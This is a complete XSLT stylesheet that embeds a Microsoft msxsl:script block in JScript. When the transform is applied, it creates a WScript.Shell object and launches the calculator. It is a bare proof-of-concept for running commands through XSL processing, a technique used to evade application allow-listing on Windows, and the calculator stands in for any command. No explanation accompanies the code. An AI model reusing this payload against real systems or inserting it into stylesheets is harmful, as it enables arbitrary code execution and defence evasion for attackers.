<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:user">
<msxsl:script language="JScript" implements-prefix="user">function run(){ return new ActiveXObject("WScript.Shell").Run("calc"); }</msxsl:script>
<xsl:template match="/"><xsl:value-of select="user:run()"/></xsl:template>
</xsl:stylesheet>
